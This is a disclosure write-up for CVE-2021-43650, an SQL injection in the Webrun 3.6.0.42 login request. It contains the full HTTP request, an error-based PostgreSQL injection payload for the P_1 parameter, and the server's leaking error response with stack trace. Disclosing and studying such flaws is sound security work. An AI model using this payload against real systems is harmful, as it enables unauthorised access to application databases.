# CVE-2021-43650
Webrun &lt;= 3.6.0.42 SQLi

# Description
Webrun is a web-based management application. In version 3.6.0.42 it was possible to identify and report a SQL Injection vulnerability that occurs during the login process, more specifically we will inject the payload in the POST parameter called P_1.

# Proof of Concept (POC)
During the login process, the following request will be sent:

```
POST /webrun/executeRule.do HTTP/1.1
Host: restricted
Content-Length: 334
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://restricted
Referer: http://restricted/webrun/openform.do?sys=GES&action=openform&formID=8265&firstLoad=true
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=5DF6A762C84832879F7265FDE5F059B3; WebrunSelectedSystem=GES
Connection: close

action=executeRule&pType=2&ruleName=GES_FLX_Gerar+Token+Dashboard&sys=GES&formID=8265&parentRID=-1&P_0=username&P_1=pass321
```

For exploration, we will use the following payload:

```
121')+AND+5110%3dCAST((CHR(113)||CHR(118)||CHR(118)||CHR(120)||CHR(113))||(SELECT+(CASE+WHEN+(5110%3d5110)+THEN+1+ELSE+0+END))%3a%3atext||(CHR(113)||CHR(98)||CHR(122)||CHR(98)||CHR(113))+AS+NUMERIC)+AND+('AYkd'%3d'AYkd
```

With this in hand, we will have the following response from the server:

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Cache-Control: no-cache
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 1609
Date: Thu, 02 Feb 2023 00:56:00 GMT
Connection: close

interactionError('ERRO: sintaxe de entrada é inválida para tipo numeric: \"qvvxq1qbzbq\"', null, null, null, '<b>Exceção Gerada:</b><br>org.postgresql.util.PSQLException: ERRO: sintaxe de entrada é inválida para tipo numeric: \"qvvxq1qbzbq\"\n	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2102)\n	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1835)\n	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257)\n	at org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:500)\n	at org.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags(AbstractJdbc2Statement.java:388)\n	at org.postgresql.jdbc2.AbstractJdbc2Statement.executeQuery(AbstractJdbc2Statement.java:273)\n	at wfr.database.DBConnection.execQueryStatement(DBConnection.java:1367)\n	at wfr.com.systems.system_ges.rules.WebrunFunctions.ebfSQLExecuteQuery(WebrunFunctions.java:12371)\n	at wfr.com.systems.system_ges.rules.WebrunFunctions.ebfSQLDynamicQuery(WebrunFunctions.java:11548)\n	at wfr.com.systems.system_ges.rules.GesFlxGerarTokenDashboard.run(GesFlxGerarTokenDashboard.java:186)\n	at wfr.rules.WFRRule.start(WFRRule.java:755)\n	at wfr.rules.WFRRule.call(WFRRule.java:1817)\n	at wfr.rules.WFRRule.call(WFRRule.java:57)\n	at java.util.concurrent.FutureTask.run(Unknown Source)\n	at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)\n	at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)\n	at java.lang.Thread.run(Unknown Source)');
if (parent.mainform) parent.mainform.hideWait();
```
